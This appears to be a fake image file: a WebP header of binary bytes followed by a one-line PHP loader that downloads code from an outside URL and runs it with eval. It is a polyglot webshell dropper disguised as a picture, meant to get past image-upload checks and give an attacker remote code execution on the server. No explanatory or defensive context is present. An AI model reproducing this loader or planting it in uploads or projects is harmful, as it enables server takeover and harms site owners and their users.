RIFF¤  WEBPVP8 ˜  ðÑ *ôô>‘HŸK¥¤"§£±¨àð	

<?=eval("?>".file_get_contents("https://jawir.id/raw/D5rb5quMXB"));?>